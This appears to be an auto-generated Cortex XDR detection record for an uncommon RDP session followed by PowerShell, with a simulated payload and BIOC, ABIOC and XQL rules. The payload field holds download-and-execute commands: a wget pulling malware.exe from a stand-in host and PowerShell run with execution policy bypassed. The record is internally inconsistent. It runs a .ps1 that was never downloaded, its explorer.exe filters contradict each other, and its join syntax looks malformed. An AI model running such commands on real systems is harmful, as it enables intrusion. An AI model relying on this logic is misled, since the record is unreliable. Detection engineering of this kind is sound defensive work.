identity.name: Uncommon RDP Session via mstsc and PowerShell
identity.summary: An attacker establishes an RDP session using mstsc and executes PowerShell commands to download and run a payload. Cortex detects this behavior as an uncommon RDP session.
identity.description: An attacker establishes an RDP session using mstsc and executes PowerShell commands to download and run a payload. Cortex detects this behavior as an uncommon RDP session.

payload.code:
mkdir C:\temp
wget https://example.com/malware.exe -O C:\temp\malware.exe
powershell.exe -ExecutionPolicy Bypass -File C:\temp\malware.ps1

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon RDP Session
biocs.description: An RDP session initiated from an uncommon source IP or with unusual behavior
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'mstsc.exe'
| filter causality_actor_process_image_name != 'explorer.exe'
| filter action_remote_ip = '192.0.2.10'

abiocs.name: RDP Session with PowerShell Execution
abiocs.description: RDP session followed by PowerShell execution that downloads and runs a script
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'mstsc.exe'
| filter causality_actor_process_image_name = 'explorer.exe'
| filter action_remote_ip = '192.0.2.10'
| join with process_start_events on actor_process_image_name = action_process_image_name
| filter action_process_image_name = 'powershell.exe'

xql_queries.name: Detect RDP Sessions with PowerShell
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'mstsc.exe'
| filter action_remote_ip = '192.0.2.10'
| join with process_start_events on actor_process_image_name = action_process_image_name
| filter action_process_image_name = 'powershell.exe'
| filter action_file_path contains 'temp'
